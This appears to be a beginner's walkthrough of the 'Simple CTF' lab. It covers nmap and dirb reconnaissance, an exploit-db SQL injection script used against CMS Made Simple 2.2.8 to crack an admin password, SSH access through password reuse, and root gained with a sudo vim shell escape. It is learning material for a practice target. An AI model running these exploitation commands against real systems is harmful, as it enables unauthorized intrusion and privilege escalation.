# SimpleCTF

Hello everybody! Today, we are setting foot to *Simple CTF*, the first CTF which challenges beginners in the free path without much guidance. Today we will look into this CTF, clarifying important things to beginners, learning new things and so much more!

## Needed Knowledge

1. Nmap
2. Gobuster / Dirb / Directory Enumeration Tool

## Recommended Knowledge

3. Completing the free path; successfully completed **Vulnversity** and **Blue**

Let's start!

## Information Gathering 

Before doing anything to the target, we must scan it using Nmap. This is essential to get an understanding of the services being used (their ports, non-default ones can be used), their versions which can lead to instant or easier exploitation (and even more with the right flags and switches!). Keep in mind that SSH is not always at port 22 and so can be for everything with standards.

```
┌─[root@parrot]─[/home/sandstoop]
└──╼ #sudo nmap -sV -sC 10.10.35.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 20:18 CEST
Nmap scan report for 10.10.35.19
Host is up (0.059s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.252
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.42 seconds
```

We can see a couple of things. There are three services being used: **FTP**, **HTTP** and **SSH**. Now, we will firstly check out the web service of things since you should always check the **HTTP** service first! Apart from being the go-to choice for CTFs and boot2roots, it can be exploited by many more tools than what awaits the other protocols: think about it, you can exploit SQL databases, application logic and CMSs, libraries and everything running inside that's vulnerable! **ALWAYS GO FOR THE WEB FIRST, MORE EXPLOITATION VECTORS**

### Information Gathering and Enumeration of Port 80 (HTTP)

When we go there, we see the Ubuntu default page which provides us with further validation that the server is indeed Ubuntu if the service names weren't enough, which gives us further proof it's Linux ;)

In the Nmap scan, the default script for the *robots.txt* file shows that there are two disallowed entries: *_/* (?) and */openemr-5_0_1_3*.

When we go to **http://10.10.35.19/openemr-5_0_1_3/**, it returns a 404 Not Found error. Furthermore, **http://10.10.35.19/openemr** returns the same thing. This means that we can put this *robots.txt bait* off and move on. Keep in mind that robots.txt is still pretty important since it can likely have admin pages or internal pages

We need to enumerate the directories of the page since it is essential to do so; this holds true no matter if the website looks basic in the front, it may hold gold in the back. Directory enumeration is essential for *every website you target* for proper penetration testing since the user may have set up a vulnerable application, library or snippet of code that may have put them in danger and allows us to do bad.

Let's do a scan with *dirb*. **Gobuster** is still a good tool however *dirb* can be used without a wordlist (using it's default wordlists), has 404 Not Found tuning which is more effective for *200 404s* (basically not found but found according to HTTP). Both tools are good in their own way (Gobuster is more functional, documented etc.) however I use *dirb* most of the time.

```
┌─[root@parrot]─[/home/sandstoop]
└──╼ #dirb http://10.10.35.19/ -R

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug 28 20:22:40 2025
URL_BASE: http://10.10.35.19/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Interactive Recursion

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.35.19/ ----
+ http://10.10.35.19/index.html (CODE:200|SIZE:11321)                                                                                                                                        
+ http://10.10.35.19/robots.txt (CODE:200|SIZE:929)                                                                                                                                          
+ http://10.10.35.19/server-status (CODE:403|SIZE:299)                                                                                                                                       
==> DIRECTORY: http://10.10.35.19/simple/                                                                                                                                                    
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/ ----
(?) Do you want to scan this directory (y/n)? y                                                                                                                                               ==> DIRECTORY: http://10.10.35.19/simple/admin/                                                                                                                                              
==> DIRECTORY: http://10.10.35.19/simple/assets/                                                                                                                                             
==> DIRECTORY: http://10.10.35.19/simple/doc/                                                                                                                                                
+ http://10.10.35.19/simple/index.php (CODE:200|SIZE:19833)                                                                                                                                  
==> DIRECTORY: http://10.10.35.19/simple/lib/                                                                                                                                                
==> DIRECTORY: http://10.10.35.19/simple/modules/                                                                                                                                            
==> DIRECTORY: http://10.10.35.19/simple/tmp/                                                                                                                                                
==> DIRECTORY: http://10.10.35.19/simple/uploads/                                                                                                                                            
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/admin/ ----
(?) Do you want to scan this directory (y/n)? y                                
+ http://10.10.35.19/simple/admin/index.php (CODE:302|SIZE:0)                                                                                                                                
==> DIRECTORY: http://10.10.35.19/simple/admin/lang/                                                                                                                                         
==> DIRECTORY: http://10.10.35.19/simple/admin/plugins/                                                                                                                                      
==> DIRECTORY: http://10.10.35.19/simple/admin/templates/                                                                                                                                    
==> DIRECTORY: http://10.10.35.19/simple/admin/themes/                                                                                                                                       
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/doc/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/lib/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/uploads/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/admin/lang/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/admin/plugins/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/admin/templates/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.
                                                                                                                                                                                             
---- Entering directory: http://10.10.35.19/simple/admin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Aug 28 20:41:32 2025
DOWNLOADED: 13836 - FOUND: 5
```

The output wasn't redacted to ensure you can fully experience this and learn from it properly. *simple*, the directory seemed weird since I had never ever seen such a directory. However, I navigated to it and turned out to be some CMS named *CMS Made Simple*. This exploitation vector is a accurate and real case (that I had done literally yesterday minus the vulns!) of a user testing out a CMS leaving the web server's default as is.

## Exploitation

This CMS could be something we can exploit. We can try to find the CMS's version via further recon however it was luckily (and this is a bad thing!) disclosed literally on the website's footer. *CMS Made Simple version 2.2.8* is the result. 

```
┌─[root@parrot]─[/usr/share/exploitdb/exploits/php/webapps]
└──╼ #searchsploit CMS Made Simple version 2.2.8
Exploits: No Results
Shellcodes: No Results
┌─[root@parrot]─[/usr/share/exploitdb/exploits/php/webapps]
└──╼ #searchsploit CMS Made Simple 2.2.8
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                    | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

The first search was improper. The second search returned a SQL injection exploit for versions less than *2.2.10* (which just happens to match)!. Let's navigate to and use the exploit. This exploit exploits a SQL injection flaw in the News module of the CMS, returning admin usernames, e-mail addresses and hashes.

```
┌─[root@parrot]─[/usr/share/exploitdb/exploits/php/webapps]
└──╼ #python2 46635.py -u http://10.10.35.19/simple --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-500-worst-passwords.txt
```

You may need the SecLists list installed. You need python2 to install it, a Python3 port is on GitHub though it has issues with hash cracking and seems to be AI-generated code. I needed to build Python2 from scratch and install pip2 (and made pip by default pip2 which is heartbreaking). Use the simple directory since the CMS is there.

The kind person who made this just so happened to include a option to crack it with a wordlist in a reliable way. This amazing gesture led to me being able to crack the password hash since **John the Ripper** kept returning false results despite the right format, **Cyberchef** wasn't quite magical and so on...

Also, don't always use the **rockyou** list. It's a good choice however it makes your laptop/machine ***BURN***. It's safer and more rewarding in more cases than none to use a small wordlist (which just so happens to likely have the password!!!) then navigate to the bigger ones for passwords (not password hash cracking).

It should take some time and we can see the password is **secret**. Now, the **rockyou** list would've taken 5 minutes or more and this took less than a second which is why smaller wordlists first is essential.

## Post-Exploitation

Now, we will take a look at our directory enumeration (information gathering) and see that there's an admin page and it's located at: http://10.10.35.19/simple/admin/. It's not at http://10.10.35.19/admin, which is what has been a safe guess for a looooong time.

These credentials were for *CMS Made Simple*, we should try log in to the admin page with **mitch** as name and **secret** as password. BOOM! We're logged in and we can notice a lot of things, in particular a File Manager which we can upload files to and get a reverse shell in the system easily. However, a reverse shell is unstable and worse compared to a SSH session which is why we should always proceed to get a SSH session or something better than a reverse shell like a *Meterpreter*. 

Password reuse is a common issue especially with Unix systems and their bad default passwords.

Let's try logging into **SSH** (*TCP port 2222*) with what we've gathered.

```
┌─[root@parrot]─[/home/sandstoop]
└──╼ #sudo ssh mitch@10.10.35.19 -p 2222
```

The mitch username is valid, and **secret** as password... and.. we are in! For a real case, if we couldn't log in, we should have attempted to upload a PHP reverse shell (or if it didn't work, fuzzed the filetypes!) and used netcat to get a shell (and attempted to PrivEsc). Meterpreters, SSH sessions and other good payloads are better than a reverse shell which may not support sudo, is a tty and generally sucks (this is what I attempted, it was so bad that usage was a nuisance and PrivEsc was impossible since sudo was closed closing the main way and a lot more!). 

We've got the flag now!

### Rooting

Using the ol' reliable trick of *sudo -l*, we can list sudo environment variables and sudoers configurations opening up the doors of PrivEsc. Let's try it!

***AMAZING***! We can see */usr/bin/vim* can be ran with sudo as root without a password. We can use GTFOBins and search for the **Sudo** section in particular to find exploitation vectors for such cases. The most reliable Vim payload for this (which does not need certain compilations) is: 

```sudo vim -c ':!/bin/sh'```

Run it... and the shell is so poor, bad that text-based output can't describe it. If it is too bad, use Ctrl+C and retry. **whoami** returns root, run this command: **find / -name "root.txt" -type f 2>/dev/null**. We can see the existence of **/root/root.txt** and we've got the flag.

Don't be sad you didn't complete it or needed help! It was a huge jump from guided payloads and instant root EternalBlue! Be proud you learned CMS exploitation, password reusing attacks and a lot more. Don't be upset you tried to exploit the wrong services, did it the wrong way (I doubt successfully) and just didn't perform well, doing it the wrong way (like with the reverse shell) is amazing and I even found a CVE (I haven't disclosed it nor submited it!) with the CMS.
